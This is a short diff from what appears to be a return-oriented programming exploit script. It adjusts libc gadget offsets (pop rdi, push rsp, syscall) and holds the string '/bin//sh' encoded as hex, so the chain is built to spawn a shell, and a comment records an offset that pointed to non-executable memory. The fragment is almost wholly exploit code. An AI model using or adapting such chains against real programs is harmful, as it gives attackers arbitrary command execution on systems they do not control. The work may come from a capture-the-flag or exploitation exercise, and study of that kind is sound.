@@ -20,7 +20,7 @@ d3 = 0x00
 g4 = LIBC_OFFSET + 0x1fc6a  #= pop rdi
 d6 = 0x2f62696e2f2f7368 #/bin//sh
 d7 = 0x2f62696e2f2f7368222c30
-g5 = LIBC_OFFSET + 0x18f503 + 0xf #push rsp
+g5 = LIBC_OFFSET + 0x177452 + 0x6 #push rsp
 g6 = LIBC_OFFSET + 0x132bae + 0xe #syscall
 
 # removed 0x1f940  from all of mine. It was given by gadgets.py as offset but seems to link to a non executable part of the library...
